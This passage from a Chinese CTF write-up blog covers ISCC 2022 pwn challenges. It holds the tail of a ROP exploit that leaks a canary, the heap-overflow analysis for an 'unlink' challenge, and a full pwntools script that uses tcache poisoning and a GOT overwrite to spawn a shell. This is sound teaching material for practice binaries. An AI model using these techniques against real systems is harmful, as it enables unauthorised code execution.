class="built_in">print</span>(<span class="string">&#x27;leak_stack--------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_stack))</span><br><span class="line">canary=u64(a[<span class="number">0xe8</span>:<span class="number">0xef</span>].rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary------------------------------&gt;&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#result=autofill_long_libc(&#x27;setbuffer&#x27;,setbuffer_addr)</span></span><br><span class="line">result=autofill_local_libc(<span class="string">&#x27;setbuffer&#x27;</span>,setbuffer_addr,libc)</span><br><span class="line">sys_addr=result[<span class="number">0</span>]</span><br><span class="line">bin_sh_addr=result[<span class="number">1</span>]</span><br><span class="line">pop_rdi_addr=base+<span class="number">0x130b</span></span><br><span class="line">leave_addr=base+<span class="number">0x124a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(sys_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(canary)+p64(leak_stack-<span class="number">0x1d0</span>-<span class="number">8</span>)+p64(leave_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h4 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/ISCC_2022_pwn.assets/image-20220531215015771.png" alt="image-20220531215015771"></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><img src="ISCC_2022_pwn.assets/image-20220531215332239.png" alt="image-20220531215332239" style="width: 50%;" />

<p>存在堆溢出，虽然题目是叫做unlink，但是我试了一下，似乎unlink做不出来（可能是我太菜了）。即使patchup成2.23的，等unlink之后，ptr&#x3D;&amp;ptr-0x18，再往fake_chunk写入数据，数据会覆盖掉stdin指针。导致程序无法再输入了。因此用unlink的方法就卡住了。</p>
<p>不过这道题是2.27的，因此可以利用溢出打tcache attack。</p>
<h4 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h4><p>先申请两个chunk，低地址的chunk作为溢出堆块。然后释放掉高地址的chunk，利用溢出修改tcachebin中chunk的fd指针（<strong>这个fd指针修改成哪，接下来申请的chunk的地址就在哪。不过由于从tcachebin中申请chunk时，会将其的bk指针的位置赋值成0，如果fd修改成了一个不可写的地址，程序在这里就会崩溃掉）</strong></p>
<p>我们fd指针修改为cmd的地址</p>
<p><img src="/ISCC_2022_pwn.assets/image-20220531231430009.png" alt="image-20220531231430009"></p>
<p>它位于bss段，是可写的。因此我们可以将它申请到bss段上，再往这个chunk里写入数据时，就修改了bss段上存储的chunk地址，将chunk地址改为free函数的got表，再对这个chunk进行修改，即可修改free的got表。</p>
<p>同时要考虑到修改完got表后，下一次输入的数据依旧再往got表里输入，这就意味着我们无法先修改free的真实地址为system，再传入&#x2F;bin&#x2F;sh**（因为下回传&#x2F;bin&#x2F;sh的时候，free的真实地址又被改成了&#x2F;bin&#x2F;sh）<u>因此需要传参和修改got表同时进行</u>**。这道题因为got表中的free和strncmp是挨着的，所以我们可以劫持free的got表，往里面写入&#x2F;bin&#x2F;sh\x00和system的plt地址，此时字符串的开头则为&#x2F;bin&#x2F;sh\x00（也就是之后strncmp的第一个参数）。同时也将system的plt地址写入到了strncmp中，等到执行strncmp的时候，成功获取shell。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x4009BD</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,lenth,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.sendline(fake_chunk)</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;remove&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">bss_addr=<span class="number">0x6010B0</span></span><br><span class="line">back_addr=<span class="number">0x400896</span></span><br><span class="line">sys_addr=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#overflow_chunk</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">payload=<span class="number">72</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x41</span>)+p64(bss_addr)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x30</span>,<span class="string">b&#x27;bb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x30</span>,p64(free_got_addr))</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2>
    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>楼上请让路*
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://wp.zgroot.cn/ISCC/ISCC_2022/" title="ISCC 2022 CTF">https://wp.zgroot.cn/ISCC/ISCC_2022/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/PWN/" rel="tag"># PWN</a>
              <a href="/tags/Web/" rel="tag"># Web</a>
              <a href="/tags/Misc/" rel="tag"># Misc</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/PWNHUB/pwnhub_vheap/" rel="prev" title="PWNHUB部分wp">
      <i class="fa fa-chevron-left"></i> PWNHUB部分wp
    </a></div>
      <div class="post-nav-item">
    <a href="/BSidesCF/%5BBSidesSF%202022%20CTF%5D/" rel="next" title="BSidesSF 2022 CTF">
      BSidesSF 2022 CTF <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Start"><span class="nav-number">1.</span> <span class="nav-text">Start</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%AC%E5%A5%A5%E4%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">冬奥会</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%B1%E5%9B%BD%E6%95%AC%E4%B8%9A%E5%A5%BD%E9%9D%92%E5%B9%B4-2"><span class="nav-number">2.2.</span> <span class="nav-text">爱国敬业好青年-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pop2022"><span class="nav-number">2.3.</span> <span class="nav-text">Pop2022</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easy-SQL"><span class="nav-number">2.4.</span> <span class="nav-text">Easy-SQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#findme"><span class="nav-number">2.5.</span> <span class="nav-text">findme</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A9%E6%88%91%E5%BA%B7%E5%BA%B7%EF%BC%81"><span class="nav-number">2.6.</span> <span class="nav-text">让我康康！</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2022%E5%86%AC%E5%A5%A5%E4%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">2022冬奥会</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E6%9D%BF%E5%B0%8F%E5%B0%86%E8%8B%8F%E7%BF%8A%E9%B8%A3"><span class="nav-number">3.2.</span> <span class="nav-text">单板小将苏翊鸣</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%90%E7%A7%98%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-number">3.3.</span> <span class="nav-text">隐秘的信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%8D%E7%BB%B4%E6%89%93%E5%87%BB"><span class="nav-number">3.4.</span> <span class="nav-text">降维打击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-1"><span class="nav-number">3.5.</span> <span class="nav-text">藏在星空中的诗-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-2"><span class="nav-number">3.6.</span> <span class="nav-text">藏在星空中的诗-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%9F%E7%9B%B8%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA"><span class="nav-number">3.7.</span> <span class="nav-text">真相只有一个</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">4.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sim-treasure"><span class="nav-number">4.1.</span> <span class="nav-text">sim_treasure</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="nav-number">4.1.1.</span> <span class="nav-text">大致思路：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP"><span class="nav-number">4.1.2.</span> <span class="nav-text">EXP:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%B3%E4%B8%80%E8%B7%B3"><span class="nav-number">4.2.</span> <span class="nav-text">跳一跳</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">4.2.1.</span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="nav-number">4.2.2.</span> <span class="nav-text">保护策略：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">4.2.3.</span> <span class="nav-text">程序分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF%EF%BC%9A-1"><span class="nav-number">4.2.4.</span> <span class="nav-text">大致思路：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP-1"><span class="nav-number">4.2.5.</span> <span class="nav-text">EXP:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-number">4.3.</span> <span class="nav-text">unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5%EF%BC%9A-1"><span class="nav-number">4.3.1.</span> <span class="nav-text">保护策略：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.3.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A7%E8%87%B4%E6%80%9D%E8%B7%AF"><span class="nav-number">4.3.3.</span> <span class="nav-text">大致思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP-2"><span class="nav-number">4.3.4.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#End"><span class="nav-number">5.</span> <span class="nav-text">End</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="楼上请让路*"
      src="/images/image.png">
  <p class="site-author-name" itemprop="name">楼上请让路*</p>
  <div class="site-description" itemprop="description">楼上请让路*的WP</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/polishing-labs" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;polishing-labs" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">楼上请让路*</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
